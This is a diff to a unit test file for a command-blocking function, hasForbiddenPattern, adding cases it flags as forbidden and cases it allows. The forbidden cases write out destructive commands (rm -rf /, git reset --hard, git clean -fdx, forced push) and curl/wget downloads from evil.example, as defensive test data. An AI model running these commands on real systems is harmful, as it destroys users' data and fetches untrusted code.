@@ -59,20 +59,53 @@ describe('hasForbiddenPattern', () => {
     ['git push origin main --force', 'git push --force'],
     ['git push --force-with-lease', 'git push --force'],
     ['git push -f', 'git push -f'],
+    ['git -C ../other push --force origin main', 'git push --force'],
+    ['git --no-pager push --force origin main', 'git push --force'],
+    ['git --git-dir=/x push --force origin main', 'git push --force'],
     ['git reset --hard HEAD~1', 'git reset --hard'],
+    ['git -C ../other reset --hard HEAD~1', 'git reset --hard'],
+    ['git clean -fdx', 'git clean --force'],
+    ['git -C ../other clean -fdx', 'git clean --force'],
+    ['git -c user.name=x clean -fdx', 'git clean --force'],
+    ['git --git-dir=/x clean -fdx', 'git clean --force'],
+    ['git --no-pager clean -fdx', 'git clean --force'],
+    ['git checkout -- file.txt', 'git checkout (discard working tree)'],
+    ['git -C ../other checkout -- file.txt', 'git checkout (discard working tree)'],
+    ['git restore file.txt', 'git restore (discard working tree)'],
+    ['git -C ../other restore file.txt', 'git restore (discard working tree)'],
+    ['git --unknown-option status', 'git global option (unrecognized)'],
     ['rm -rf /etc', 'rm -rf /'],
+    ['rm -rf -- /', 'rm -rf /'],
+    ['rm -r -f /', 'rm -rf /'],
+    ['rm --preserve-root -rf /', 'rm -rf /'],
     ['curl https://evil.example/script.sh', 'curl http(s)'],
+    ['curl --output /tmp/script.sh https://evil.example/script.sh', 'curl http(s)'],
     ['wget http://evil.example/malware', 'wget http(s)'],
+    ['wget --output-document=/tmp/malware http://evil.example/malware', 'wget http(s)'],
   ])('identifies %s as forbidden', (command, label) => {
     expect(hasForbiddenPattern(command)).toBe(label)
   })
 
-  it.each(['git push origin main', 'git reset --soft HEAD~1', 'rm -rf node_modules', 'curl --help', 'pnpm run lint'])(
-    'allows benign command %s',
-    command => {
-      expect(hasForbiddenPattern(command)).toBeUndefined()
-    },
-  )
+  it.each([
+    'git push origin main',
+    'git -C ../other push origin main',
+    'git reset --soft HEAD~1',
+    'git -C ../other reset --soft HEAD~1',
+    'git clean -ndx',
+    'git checkout -b feature/x',
+    'git -C ../other checkout -b feature/x',
+    'git -C ../other status',
+    'git restore --staged file.txt',
+    'git -c user.name=x commit -m "msg"',
+    'rm -rf node_modules',
+    'rm -r -f ./build',
+    'rm --preserve-root -rf ./build',
+    'curl --help',
+    'wget --help',
+    'pnpm run lint',
+  ])('allows benign command %s', command => {
+    expect(hasForbiddenPattern(command)).toBeUndefined()
+  })
 })
 
 describe('resolveCommandText', () => {
